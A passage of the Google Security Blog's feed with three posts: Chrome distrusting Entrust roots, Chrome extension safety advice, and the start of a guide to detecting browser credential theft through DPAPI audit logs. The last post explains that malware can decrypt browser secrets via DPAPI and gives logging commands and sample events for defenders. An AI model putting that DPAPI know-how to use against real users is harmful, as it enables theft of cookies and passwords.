</li><li><a href="https://crt.sh/?q=43DF5774B03E7FEF5FE40D931A7BEDF1BB2E6B42738C4E6D3841103D3AA7F339">CN=Entrust Root Certification Authority - G2,OU=See www.entrust.net/legal-terms+OU=(c) 2009 Entrust, Inc. - for authorized use only,O=Entrust, Inc.,C=US</a>
 
</li><li><a href="https://crt.sh/?q=6DC47172E01CBCB0BF62580D895FE2B8AC9AD4F873801E0C10B9C837D21EB177">CN=Entrust.net Certification Authority (2048),OU=www.entrust.net/CPS_2048 incorp. by ref. (limits liab.)+OU=(c) 1999 Entrust.net Limited,O=Entrust.net</a>
 
</li><li><a href="https://crt.sh/?q=73C176434F1BC6D5ADF45B0E76E727287C8DE57616C1E6E6141A2B2CBC7D8E4C">CN=Entrust Root Certification Authority,OU=www.entrust.net/CPS is incorporated by reference+OU=(c) 2006 Entrust, Inc.,O=Entrust, Inc.,C=US</a>
 
</li><li><a href="https://crt.sh/?q=DB3517D1F6732A2D5AB97C533EC70779EE3270A62FB4AC4238372460E6F01E88">CN=Entrust Root Certification Authority - G4,OU=See www.entrust.net/legal-terms+OU=(c) 2015 Entrust, Inc. - for authorized use only,O=Entrust, Inc.,C=US</a>
 
</li><li><a href="https://crt.sh/?q=0376AB1D54C5F9803CE4B2E201A0EE7EEF7B57B636E8A93C9B8D4860C96F5FA7">CN=AffirmTrust Commercial,O=AffirmTrust,C=US</a>
 
</li><li><a href="https://crt.sh/?q=0A81EC5A929777F145904AF38D5D509F66B5E2C58FCDB531058B0E17F3F0B41B">CN=AffirmTrust Networking,O=AffirmTrust,C=US</a>
 
</li><li><a href="https://crt.sh/?q=70A73F7F376B60074248904534B11482D5BF0E698ECC498DF52577EBF2E93B9A">CN=AffirmTrust Premium,O=AffirmTrust,C=US</a>
 
</li><li><a href="https://crt.sh/?q=BD71FDF6DA97E4CF62D1647ADD2581B07D79ADF8397EB4ECBA9C5E8488821423">CN=AffirmTrust Premium ECC,O=AffirmTrust,C=US</a>	
</li></ul></li><li>TLS server authentication certificates validating to the above set of roots whose <em>earliest</em> SCT is <span>on or before</span> <strong>October 31, 2024,</strong> will be unaffected by this change.</li></ul>This approach attempts to minimize disruption to existing subscribers using a recently announced Chrome <a href="https://source.chromium.org/chromium/chromium/src/+/main:net/cert/root_store.proto;drc=a783c3bab474ff68e675e2753f91c92ca817e072;l=15?q=f:root_store.proto&amp;ss=chromium">feature</a> to remove default trust based on the SCTs in certificates.<br />
<p>
Additionally, should a Chrome user or enterprise <a href="https://chromium.googlesource.com/chromium/src/+/main/net/data/ssl/chrome_root_store/faq.md#Does-the-Chrome-Certificate-Verifier-consider-local-trust-decisions">explicitly trust</a> any of the above certificates on a platform and version of Chrome <a href="https://chromium.googlesource.com/chromium/src/+/main/net/data/ssl/chrome_root_store/faq.md#when-did-these-features-land">relying</a> on the <a href="https://chromium.googlesource.com/chromium/src/+/main/net/data/ssl/chrome_root_store/root_store.md">Chrome Root Store</a> (e.g., explicit trust is conveyed through a Group Policy Object on Windows), the SCT-based constraints described above will be overridden and certificates will function as they do today.  
</p>
<p>
To further minimize risk of disruption, website operators are encouraged to review the “Frequently Asked Questions" listed below.
</p>
<h3><strong>Why is Chrome taking action?</strong></h3>


<p>
Certification Authorities (CAs) serve a privileged and trusted role on the Internet that underpin encrypted connections between browsers and websites. With this tremendous responsibility comes an expectation of adhering to reasonable and consensus-driven security and compliance expectations, including those defined by the CA/Browser TLS Baseline Requirements.  
</p>
<p>
Over the past six years, we have observed a pattern of compliance failures, unmet improvement commitments, and the absence of tangible, measurable progress in response to publicly disclosed incident reports. When these factors are considered in aggregate and considered against the inherent risk each publicly-trusted CA poses to the Internet ecosystem, it is our opinion that Chrome’s continued trust in Entrust is no longer justified. 
</p>
<h3><strong>When will this action happen?</strong></h3>


<p>
Blocking action will begin on approximately November 1, 2024, affecting certificates issued at that point or later.
</p>
<p>
Blocking action will occur in Versions of <a href="https://chromiumdash.appspot.com/schedule">Chrome 127</a> and greater on Windows, macOS, ChromeOS, Android, and Linux. Apple policies prevent the Chrome Certificate Verifier and corresponding Chrome Root Store from being used on Chrome for iOS.
</p>
<h3><strong>What is the user impact of this action?</strong></h3>


<p>
By default, Chrome users in the above populations who navigate to a website serving a certificate issued by Entrust or AffirmTrust after October 31, 2024 will see a full page interstitial <a href="https://untrusted-root.badssl.com/">similar to this one</a>.
</p>
<p>
Certificates issued by other CAs are not impacted by this action.
</p>
<h3><strong>How can a website operator tell if their website is affected?</strong></h3>


<p>
Website operators can determine if they are affected by this issue by using the Chrome Certificate Viewer.
</p>
<p>
<span style="text-decoration: underline;">Use the Chrome Certificate Viewer</span>
</p>
<ul>

<li>Navigate to a website (e.g., <a href="https://www.google.com">https://www.google.com</a>)

</li><li>Click the “Tune" icon

</li><li>Click “Connection is Secure" 

</li><li>Click “Certificate is Valid" (the Chrome Certificate Viewer will open) 
<ul>
 
<li><strong>Website owner action is&nbsp;<span style="text-decoration: underline;">not</span> required</strong>, if the “Organization (O)” field listed beneath the “Issued By" heading <span style="text-decoration: underline;">does not</span> contain “Entrust" or “AffirmTrust”.
 
</li><li><strong>Website owner action is required</strong>, if the “Organization (O)” field listed beneath the “Issued By" heading contains “Entrust" or “AffirmTrust”.
</li> 
</ul>
</li> 
</ul>
<h3><strong>What does an affected website operator do?</strong></h3>


<p>
We recommend that affected website operators transition to a new publicly-trusted CA Owner as soon as reasonably possible. To avoid adverse website user impact, action <strong>must</strong> be completed <span style="text-decoration: underline;">before</span> the existing certificate(s) expire if expiry is planned to take place <span style="text-decoration: underline;">after</span> October 31, 2024. 
</p>
<p>
While website operators could delay the impact of blocking action by choosing to collect and install a new TLS certificate issued from Entrust before Chrome’s blocking action begins on November 1, 2024, website operators will inevitably need to collect and install a new TLS certificate from one of the many other CAs included in the <a href="https://chromium.googlesource.com/chromium/src/+/main/net/data/ssl/chrome_root_store/root_store.md">Chrome Root Store</a>.
</p>
<h3><strong>Can I test these changes before they take effect?</strong></h3>


<p>
Yes.
</p>
<p>
A command-line flag was added beginning in Chrome 128 (available in Canary/Dev at the time of this post’s publication) that allows administrators and power users to simulate the effect of an SCTNotAfter distrust constraint as described in this blog post FAQ.
</p>
<p>
<span style="text-decoration: underline;">How to: Simulate an SCTNotAfter distrust</span></p><p>1. Close all open versions of Chrome</p><p>2. Start Chrome using the following command-line flag, substituting variables described below with actual values</p>

<div class="code">
--test-crs-constraints=$[Comma Separated List of Trust Anchor Certificate SHA256 Hashes]:sctnotafter=$[epoch_timestamp]
</div><p>

</p><p>3. Evaluate the effects of the flag with test websites&nbsp;</p><p><b>Example:</b>&nbsp;The following command will simulate an SCTNotAfter distrust with an effective date of April 30, 2024 11:59:59 PM GMT for all of the Entrust trust anchors included in the Chrome Root Store. The expected behavior is that any website whose certificate is issued before the enforcement date/timestamp will function in Chrome, and all issued after will display an interstitial.</p><p>
  </p><div class="code">
--test-crs-constraints=02ED0EB28C14DA45165C566791700D6451D7FB56F0B2AB1D3B8EB070E56EDFF5,
43DF5774B03E7FEF5FE40D931A7BEDF1BB2E6B42738C4E6D3841103D3AA7F339,
6DC47172E01CBCB0BF62580D895FE2B8AC9AD4F873801E0C10B9C837D21EB177,
73C176434F1BC6D5ADF45B0E76E727287C8DE57616C1E6E6141A2B2CBC7D8E4C,
DB3517D1F6732A2D5AB97C533EC70779EE3270A62FB4AC4238372460E6F01E88,
0376AB1D54C5F9803CE4B2E201A0EE7EEF7B57B636E8A93C9B8D4860C96F5FA7,
0A81EC5A929777F145904AF38D5D509F66B5E2C58FCDB531058B0E17F3F0B41B,
70A73F7F376B60074248904534B11482D5BF0E698ECC498DF52577EBF2E93B9A,
BD71FDF6DA97E4CF62D1647ADD2581B07D79ADF8397EB4ECBA9C5E8488821423
:sctnotafter=1714521599
</div>
<p><strong>Illustrative Command (on Windows):</strong>
</p><div class="code">
"C:\Users\User123\AppData\Local\Google\Chrome SxS\Application\chrome.exe" --test-crs-constraints=02ED0EB28C14DA45165C566791700D6451D7FB56F0B2AB1D3B8EB070E56EDFF5,43DF5774B03E7FEF5FE40D931A7BEDF1BB2E6B42738C4E6D3841103D3AA7F339,6DC47172E01CBCB0BF62580D895FE2B8AC9AD4F873801E0C10B9C837D21EB177,73C176434F1BC6D5ADF45B0E76E727287C8DE57616C1E6E6141A2B2CBC7D8E4C,DB3517D1F6732A2D5AB97C533EC70779EE3270A62FB4AC4238372460E6F01E88,0376AB1D54C5F9803CE4B2E201A0EE7EEF7B57B636E8A93C9B8D4860C96F5FA7,0A81EC5A929777F145904AF38D5D509F66B5E2C58FCDB531058B0E17F3F0B41B,70A73F7F376B60074248904534B11482D5BF0E698ECC498DF52577EBF2E93B9A,BD71FDF6DA97E4CF62D1647ADD2581B07D79ADF8397EB4ECBA9C5E8488821423:sctnotafter=1714521599
</div><p><strong>Illustrative Command (on macOS):</strong>
</p><div class="code">
"/Applications/Google Chrome Canary.app/Contents/MacOS/Google Chrome Canary" --test-crs-constraints=02ED0EB28C14DA45165C566791700D6451D7FB56F0B2AB1D3B8EB070E56EDFF5,43DF5774B03E7FEF5FE40D931A7BEDF1BB2E6B42738C4E6D3841103D3AA7F339,6DC47172E01CBCB0BF62580D895FE2B8AC9AD4F873801E0C10B9C837D21EB177,73C176434F1BC6D5ADF45B0E76E727287C8DE57616C1E6E6141A2B2CBC7D8E4C,DB3517D1F6732A2D5AB97C533EC70779EE3270A62FB4AC4238372460E6F01E88,0376AB1D54C5F9803CE4B2E201A0EE7EEF7B57B636E8A93C9B8D4860C96F5FA7,0A81EC5A929777F145904AF38D5D509F66B5E2C58FCDB531058B0E17F3F0B41B,70A73F7F376B60074248904534B11482D5BF0E698ECC498DF52577EBF2E93B9A,BD71FDF6DA97E4CF62D1647ADD2581B07D79ADF8397EB4ECBA9C5E8488821423:sctnotafter=1714521599
</div><p><strong>Note: </strong>If copy and pasting the above commands, ensure no line-breaks are introduced. 
</p><p>
Learn more about command-line flags <a href="https://developer.chrome.com/docs/web-platform/chrome-flags#command-line_flags">here</a>.
</p><h3><strong>I use Entrust certificates for my internal enterprise network, do I need to do anything?</strong></h3><p>
Beginning in Chrome 127, enterprises can override Chrome Root Store constraints like those described for Entrust in this blog post by installing the corresponding root CA certificate as a <a href="https://chromium.googlesource.com/chromium/src/+/main/net/data/ssl/chrome_root_store/faq.md#Does-the-Chrome-Certificate-Verifier-consider-local-trust-decisions">locally-trusted root</a> on the platform Chrome is running (e.g., installed in the Microsoft Certificate Store as a Trusted Root CA).
</p><h3><strong>How do enterprises add a CA as locally-trusted?</strong></h3><p>
Customer organizations should defer to platform provider guidance. 
</p><h3><strong>What about other Google products?</strong></h3><p>
Other Google product team updates may be made available in the future.</p><p></p><p></p>
]]></content:encoded>
<pubDate>2024-07-22T14:53:37.400-04:00</pubDate>
</item>
<item>
<title>Staying Safe with Chrome Extensions</title>
<link>http://security.googleblog.com/2024/06/staying-safe-with-chrome-extensions.html</link>
<guid>http://security.googleblog.com/2024/06/staying-safe-with-chrome-extensions.html</guid>
<content:encoded><![CDATA[
<span class="byline-author">Posted by Benjamin Ackerman, Anunoy Ghosh and David Warren, Chrome Security Team </span>


    



<p>
Chrome extensions can boost your browsing, empowering you to do anything from customizing the look of sites to providing personalized advice when you’re planning a vacation. But as with any software, extensions can also introduce risk. 
</p>
<p>
That’s why we have a team whose only job is to focus on keeping you safe as you install and take advantage of Chrome extensions. Our team:<br />
</p>
<ul>

<li>Provides you with a personalized summary of the extensions you’ve installed

</li><li>Reviews extensions before they’re published on the Chrome Web Store

</li><li>Continuously monitors extensions after they’re published
</li>
</ul>
<h3 style="text-align: left;">A summary of your extensions</h3>


<p>
The top of the extensions page (chrome://extensions) warns you of any extensions you have installed that might pose a security risk. (If you don’t see a warning panel, you probably don’t have any extensions you need to worry about.) The panel includes:
</p>
<ul>

<li>Extensions suspected of including malware

</li><li>Extensions that violate Chrome Web Store policies

</li><li>Extensions that have been unpublished by a developer, which might indicate that an extension is no longer supported

</li><li>Extensions that aren’t from the <a href="chromewebstore.google.com/">Chrome Web Store</a>

</li><li>Extensions that haven’t published what they do with data they collect and other privacy practices  
</li>
</ul>
<p>
You’ll get notified when Chrome’s Safety Check has recommendations for you or you can check on your own by running Safety Check. Just type “run safety check” in Chrome’s address bar and select the corresponding shortcut: “Go to Chrome safety check.”</p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgGnX_FKYFwb8VZZcQnZ3-XBpz2N_7yicx-E6FYd0gPL2-WtKiKStwT6-9h-i6y-wlxaFuCriKKNceyRJxSIBkP4V2b0-rk-TK0C9XNxivbsUmpJe3o7TCrlAlKS2eO39XDVePBHjwjI9AqOnCcs-X7qiiFL3wfozInqP5FxGs4dykCva0QObfrWxAqd2g5/s1920/PS_Extension-Review-Panel_V3.gif" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgGnX_FKYFwb8VZZcQnZ3-XBpz2N_7yicx-E6FYd0gPL2-WtKiKStwT6-9h-i6y-wlxaFuCriKKNceyRJxSIBkP4V2b0-rk-TK0C9XNxivbsUmpJe3o7TCrlAlKS2eO39XDVePBHjwjI9AqOnCcs-X7qiiFL3wfozInqP5FxGs4dykCva0QObfrWxAqd2g5/s16000/PS_Extension-Review-Panel_V3.gif" /></a></div>

<p style="text-align: center;">
<em>User flow of removing extensions highlighted by Safety Check.</em>
</p>
<p style="text-align: left;">
Besides the Safety Check, you can visit the extensions page directly in a number of ways:
</p>
<ul>

<li>Navigate to chrome://extensions

</li><li>Click the puzzle icon and choose “Manage extensions”

</li><li>Click the More choices menu and choose menu &gt; Extensions &gt; Manage Extensions
</li>
</ul>
<h3 style="text-align: left;">Reviewing extensions before they’re published</h3>


<p>
Before an extension is even accessible to install from the Chrome Web Store, we have two levels of verification to ensure an extension is safe:
</p>
<ol>

<li><strong>An automated review</strong>: Each extension gets examined by our machine-learning systems to spot possible violations or suspicious behavior.

</li><li><strong>A human review</strong>: Next, a team member examines the images, descriptions, and public policies of each extension. Depending on the results of both the automated and manual review, we may perform an even deeper and more thorough review of the code. 
</li>
</ol>
<p>
This review process weeds out the overwhelming majority of bad extensions before they even get published. In 2024, less than 1% of all installs from the Chrome Web Store were found to include malware. We're proud of this record and yet some bad extensions still get through, which is why we also monitor published extensions.
</p>
<h3 style="text-align: left;">Monitoring published extensions</h3>


<p>
The same Chrome team that reviews extensions before they get published also reviews extensions that are already on the Chrome Web Store. And just like the pre-check, this monitoring includes both human and machine reviews. We also work closely with trusted security researchers outside of Google, and even pay researchers who report possible threats to Chrome users through our <a href="https://bughunters.google.com/about/rules/5878023369523200/developer-data-protection-reward-program-rules#chrome-extensions">Developer Data Protection Rewards Program</a>.
</p>
<p>
What about extensions that get updated over time, or are programmed to execute malicious code at a later date? Our systems monitor for that as well, by periodically reviewing what extensions are actually doing and comparing that to the stated objectives defined by each extension in the Chrome Web Store.
</p>
<p>
If the team finds that an extension poses a severe risk to Chrome users, it’s immediately remove from the Chrome Web Store and the extension gets disabled on all browsers that have it installed.</p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh5EZOqvRh5BCBErZ6qEN2pXYDPjbCUXL8VmMKCXo-Hz57cfx9yMD97oCmoZ2qpHOGM-3rAPkoStj458SJLdFSz2lNKq6ggIsbb31Paa2uEK_j1YsHlJVnk0wWkRRxQpYjAKWHkldOktUBtVLLogyHg40TTt4SdqY4aQFit9PhYdDT6RJrgwrW0xN5vNeZg/s2000/Chrome_Privacy-Sandbox_Extensions-Safety-Blog-In-line-Asset-1.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh5EZOqvRh5BCBErZ6qEN2pXYDPjbCUXL8VmMKCXo-Hz57cfx9yMD97oCmoZ2qpHOGM-3rAPkoStj458SJLdFSz2lNKq6ggIsbb31Paa2uEK_j1YsHlJVnk0wWkRRxQpYjAKWHkldOktUBtVLLogyHg40TTt4SdqY4aQFit9PhYdDT6RJrgwrW0xN5vNeZg/s16000/Chrome_Privacy-Sandbox_Extensions-Safety-Blog-In-line-Asset-1.png" /></a></div><p style="text-align: center;"><i>The extensions page highlights when you have a potentially unsafe extension downloaded</i></p>



<div class="code">
<h3 style="text-align: left;">Others steps you can take to stay safe</h3><div><br /></div><div><br /></div>


<h2 style="text-align: left;">Review new extensions before installing them</h2>


<p>
The Chrome Web Store provides useful information about each extension and its developer. The following information should help you decide whether it’s safe to install an extension: 
</p>
<ul>

<li><a href="https://blog.google/products/chrome/find-great-extensions-new-chrome-web-store-badges/">Verified and featured badges</a> are awarded by the Chrome team to extensions that follow our technical best practices and meet a high standard of user experience and design

</li><li>Ratings and reviews from our users

</li><li>Information about the developer

</li><li>Privacy practices, including information about how an extension handles your data
</li>
</ul>
<p>
Be careful of sites that try to quickly persuade you to install extensions, especially if the site has little in common with the extension.
</p>
<h2 style="text-align: left;">Review extensions you’ve already installed</h2>


<p>
Even though Safety Check and your Extensions page (chrome://extensions) warn you of extensions that might pose a risk, it’s still a good idea to review your extensions from time to time. 
</p>
<ol>

<li>Uninstall extensions that you no longer use.

</li><li>Review the description of an extension in the Chrome Web Store, considering the extension’s ratings, reviews, and privacy practices — reviews can change over time.

</li><li>Compare an extension’s stated goals with 1) the permissions requested by an extension and 2) the privacy practices published by the extension. If requested permissions don’t align with stated goals, consider uninstalling the extension.

</li><li><a href="https://support.google.com/chrome_webstore/answer/2664769?hl=en">Limit the sites</a> an extension has permission to work on. 
</li>
</ol>
<h2 style="text-align: left;">Enable Enhanced Protection</h2>


<p>
The Enhanced protection mode of Safe Browsing is Chrome’s <a href="https://security.googleblog.com/2022/12/enhanced-protection-strongest-level-of.html">highest level of protection</a> that we offer. Not only does this mode provide you with the best protections against phishing and malware, but it also provides additional features targeted to keep you safe against potentially harmful extensions. Threats are constantly evolving and Safe Browsing’s Enhanced protection mode is the best way to ensure that you have the most advanced security features in Chrome. This can be enabled from the Safe Browsing settings page in Chrome (chrome://settings/security) and selecting “Enhanced”.
</p>
</div>
]]></content:encoded>
<pubDate>2024-06-20T12:20:37.708-04:00</pubDate>
</item>
<item>
<title>Detecting browser data theft using Windows Event Logs</title>
<link>http://security.googleblog.com/2024/04/detecting-browser-data-theft-using.html</link>
<guid>http://security.googleblog.com/2024/04/detecting-browser-data-theft-using.html</guid>
<content:encoded><![CDATA[
<span class="byline-author">Posted by  Will Harris, Chrome Security Team</span>




    


<p>
</p>
<p>
</p>
<p>Chromium's sandboxed process model defends well from malicious web content, but there are limits to how well the application can protect itself from malware already on the computer. Cookies and other credentials remain a high value target for attackers, and we are trying to tackle this ongoing threat in multiple ways, including working on web standards like
  <a href="https://blog.chromium.org/2024/04/fighting-cookie-theft-using-device.html" target="_blank">DBSC</a>
  that will help disrupt the cookie theft industry since exfiltrating these cookies will no longer have any value.</p>
<p>Where it is not possible to prevent the theft of credentials and cookies by malware, the next best thing is making the attack more observable by antivirus, endpoint detection agents, or enterprise administrators with basic log analysis tools.</p>
<p>This blog describes one set of signals for use by system administrators or endpoint detection agents that should reliably flag any access to the browser’s protected data from another application on the system. By increasing the likelihood of an attack being detected, this changes the calculus for those attackers who might have a strong desire to remain stealthy, and might cause them to rethink carrying out these types of attacks against our users.</p>
<p>
  <strong>Background</strong>
</p>
<p>Chromium based browsers on Windows use the DPAPI (Data Protection API) to secure local secrets such as cookies, password etc. against theft. DPAPI protection is based on a key derived from the user's login credential and is designed to protect against unauthorized access to secrets from other users on the system, or when the system is powered off. Because the DPAPI secret is bound to the logged in user, it cannot protect against local malware attacks — malware executing as the user or at a higher privilege level can just call the same APIs as the browser to obtain the DPAPI secret.</p>
<p>Since 2013, Chromium has been applying the CRYPTPROTECT_AUDIT flag to DPAPI calls to request that an audit log be generated when decryption occurs, as well as tagging the data as being owned by the browser. Because all of Chromium's encrypted data storage is backed by a DPAPI-secured key, any application that wishes to decrypt this data, including malware, should always reliably generate a clearly observable event log, which can be used to detect these types of attacks.</p>
<p>There are three main steps involved in taking advantage of this log:</p>
<ol>
  <li>Enable logging on the computer running Google Chrome, or any other Chromium based browser.</li>
  <li>Export the event logs to your backend system.</li>
  <li>Create detection logic to detect theft.</li>
</ol>
<p>This blog will also show how the logging works in practice by testing it against a python password stealer.</p>
<p>
  <strong>Step 1: Enable logging on the system</strong>
</p>
<p>DPAPI events are logged into two places in the system. Firstly, there is the
  <a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4693" target="_blank">4693</a> event that can be logged into the Security Log. This event can be enabled by turning on "Audit DPAPI Activity" and the steps to do this are described
  <a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-dpapi-activity" target="_blank">here</a>, the policy itself sits deep within Security Settings -&gt; Advanced Audit Policy Configuration -&gt; Detailed Tracking.</p>
<p>Here is what the 4693 event looks like:</p>
<div class="code">
&lt;Event xmlns&amp;equals&quot;http&amp;colon&amp;sol&amp;solschemas&amp;periodmicrosoft&amp;periodcom&amp;solwin&amp;sol2004&amp;sol08&amp;solevents&amp;solevent&quot;&gt;&amp;NewLine  &lt;System&gt;&amp;NewLine    &lt;Provider Name&amp;equals&quot;Microsoft-Windows-Security-Auditing&quot; Guid&amp;equals&quot;&amp;lcub&amp;period&amp;period&amp;period&amp;rcub&quot; &amp;sol&gt;&amp;NewLine    &lt;EventID&gt;4693&lt;&amp;solEventID&gt;&amp;NewLine    &lt;Version&gt;0&lt;&amp;solVersion&gt;&amp;NewLine    &lt;Level&gt;0&lt;&amp;solLevel&gt;&amp;NewLine    &lt;Task&gt;13314&lt;&amp;solTask&gt;&amp;NewLine    &lt;Opcode&gt;0&lt;&amp;solOpcode&gt;&amp;NewLine    &lt;Keywords&gt;0x8020000000000000&lt;&amp;solKeywords&gt;&amp;NewLine    &lt;TimeCreated SystemTime&amp;equals&quot;2015-08-22T06&amp;colon25&amp;colon14&amp;period589407700Z&quot; &amp;sol&gt;&amp;NewLine    &lt;EventRecordID&gt;175809&lt;&amp;solEventRecordID&gt;&amp;NewLine    &lt;Correlation &amp;sol&gt;&amp;NewLine    &lt;Execution ProcessID&amp;equals&quot;520&quot; ThreadID&amp;equals&quot;1340&quot; &amp;sol&gt;&amp;NewLine    &lt;Channel&gt;Security&lt;&amp;solChannel&gt;&amp;NewLine    &lt;Computer&gt;DC01&amp;periodcontoso&amp;periodlocal&lt;&amp;solComputer&gt;&amp;NewLine    &lt;Security &amp;sol&gt;&amp;NewLine  &lt;&amp;solSystem&gt;&amp;NewLine  &lt;EventData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;SubjectUserSid&quot;&gt;S-1-5-21-3457937927-2839227994-823803824-1104&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;SubjectUserName&quot;&gt;dadmin&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;SubjectDomainName&quot;&gt;CONTOSO&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;SubjectLogonId&quot;&gt;0x30d7c&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;MasterKeyId&quot;&gt;0445c766-75f0-4de7-82ad-d9d97aad59f6&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;RecoveryReason&quot;&gt;0x5c005c&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;RecoveryServer&quot;&gt;DC01&amp;periodcontoso&amp;periodlocal&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;RecoveryKeyId&quot; &amp;sol&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;FailureId&quot;&gt;0x380000&lt;&amp;solData&gt;&amp;NewLine  &lt;&amp;solEventData&gt;&amp;NewLine&lt;&amp;solEvent&gt;
</div>
<p>The issue with the 4693 event is that while it is generated if there is DPAPI activity on the system, it unfortunately does not contain information about which process was performing the DPAPI activity, nor does it contain information about which particular secret is being accessed. This is because the
  <strong>Execution ProcessID</strong>
  field in the event will always be the process id of lsass.exe because it is this process that manages the encryption keys for the system, and there is no entry for the description of the data.</p>
<p>It was for this reason that, in recent versions of Windows a new event type was added to help identify the process making the DPAPI call directly. This event was added to the
  <strong>Microsoft-Windows-Crypto-DPAPI</strong>
  stream which manifests in the Event Log in the Applications and Services Logs &gt; Microsoft &gt; Windows &gt; Crypto-DPAPI part of the Event Viewer tree.</p>
<p>The new event is called
  <strong>DPAPIDefInformationEvent</strong>
  and has id 16385, but unfortunately is only emitted to the Debug channel and by default this is not persisted to an Event Log, unless Debug channel logging is enabled. This can be accomplished by enabling it directly in powershell:</p>
<div class="code">
&amp;dollarlog &amp;equals &amp;grave&amp;NewLine   New-Object System&amp;periodDiagnostics&amp;periodEventing&amp;periodReader&amp;periodEventLogConfiguration &amp;grave&amp;NewLine   Microsoft-Windows-Crypto-DPAPI&amp;solDebug&amp;NewLine&amp;dollarlog&amp;periodIsEnabled &amp;equals &amp;dollarTrue&amp;NewLine&amp;dollarlog&amp;periodSaveChanges&amp;lpar&amp;rpar&amp;NewLine
</div>
<p>Once this log is enabled then you should start to see 16385 events generated, and these will contain the real process ids of applications performing DPAPI operations. Note that 16385 events are emitted by the operating system even for data not flagged with CRYPTPROTECT_AUDIT, but to identify the data as owned by the browser, the data description is essential. 16385 events are described later.</p>
<p>You will also want to enable
  <a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-process-creation" target="_blank">Audit Process Creation</a> in order to be able to know a current mapping of process ids to process names — more details on that later. You might want to also consider enabling logging of
  <a href="https://learn.microsoft.com/en-gb/windows-server/identity/ad-ds/manage/component-updates/command-line-process-auditing" target="_blank">full command lines</a>.</p>
<p>
  <strong>Step 2: Collect the events</strong>
</p>
<p>The events you want to collect are:</p>
<ul>
  <li>From Security log:</li><p></p>
<ul>
  <li>
    <a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4688" target="_blank">4688</a>: "A new process was created."
  </li>
</ul>
  <p></p><li>From Microsoft-Windows-Crypto-DPAPI/Debug log: (enabled above)</li><p></p>
<ul>
  <li>16385: "DPAPIDefInformationEvent"</li>
</ul>
</ul>
<p>These should be collected from all workstations, and persisted into your enterprise logging system for analysis.</p>
<p>
  <strong>Step 3: Write detection logic to detect theft.</strong>
</p>
<p>With these two events is it now possible to detect when an unauthorized application calls into DPAPI to try and decrypt browser secrets.</p>
<p>The general approach is to generate a map of process ids to active processes using the 4688 events, then every time a 16385 event is generated, it is possible to identify the currently running process, and alert if the process does not match an authorized application such as Google Chrome. You might find your enterprise logging software can already keep track of which process ids map to which process names, so feel free to just use that existing functionality.</p>
<p>Let's dive deeper into the events.</p>
<p>A 4688 event looks like this - e.g. here is Chrome browser launching from explorer:</p>
<div class="code">
&lt;Event xmlns&amp;equals&quot;http&amp;colon&amp;sol&amp;solschemas&amp;periodmicrosoft&amp;periodcom&amp;solwin&amp;sol2004&amp;sol08&amp;solevents&amp;solevent&quot;&gt;&amp;NewLine  &lt;System&gt;&amp;NewLine    &lt;Provider Name&amp;equals&quot;Microsoft-Windows-Security-Auditing&quot; Guid&amp;equals&quot;&amp;lcub...&amp;rcub&quot; &amp;sol&gt;&amp;NewLine    &lt;EventID&gt;4688&lt;&amp;solEventID&gt;&amp;NewLine    &lt;Version&gt;2&lt;&amp;solVersion&gt;&amp;NewLine    &lt;Level&gt;0&lt;&amp;solLevel&gt;&amp;NewLine    &lt;Task&gt;13312&lt;&amp;solTask&gt;&amp;NewLine    &lt;Opcode&gt;0&lt;&amp;solOpcode&gt;&amp;NewLine    &lt;Keywords&gt;0x8020000000000000&lt;&amp;solKeywords&gt;&amp;NewLine    &lt;TimeCreated SystemTime&amp;equals&quot;2024-03-28T20&amp;colon06&amp;colon41&amp;period9254105Z&quot; &amp;sol&gt;&amp;NewLine    &lt;EventRecordID&gt;78258343&lt;&amp;solEventRecordID&gt;&amp;NewLine    &lt;Correlation &amp;sol&gt;&amp;NewLine    &lt;Execution ProcessID&amp;equals&quot;4&quot; ThreadID&amp;equals&quot;54256&quot; &amp;sol&gt;&amp;NewLine    &lt;Channel&gt;Security&lt;&amp;solChannel&gt;&amp;NewLine    &lt;Computer&gt;WIN-GG82ULGC9GO&amp;periodcontoso&amp;periodlocal&lt;&amp;solComputer&gt;&amp;NewLine    &lt;Security &amp;sol&gt;&amp;NewLine  &lt;&amp;solSystem&gt;&amp;NewLine  &lt;EventData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;SubjectUserSid&quot;&gt;S-1-5-18&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;SubjectUserName&quot;&gt;WIN-GG82ULGC9GO&amp;dollar&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;SubjectDomainName&quot;&gt;CONTOSO&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;SubjectLogonId&quot;&gt;0xe8c85cc&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;<span class="highlight">NewProcessId</span>&quot;&gt;<span class="highlight">0x17eac</span>&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;NewProcessName&quot;&gt;C&amp;colon&amp;bsolProgram Files&amp;bsolGoogle&amp;bsolChrome&amp;bsolApplication&amp;bsolchrome&amp;periodexe&lt;&amp;solData&gt;&amp;NewLine    &lt;Data 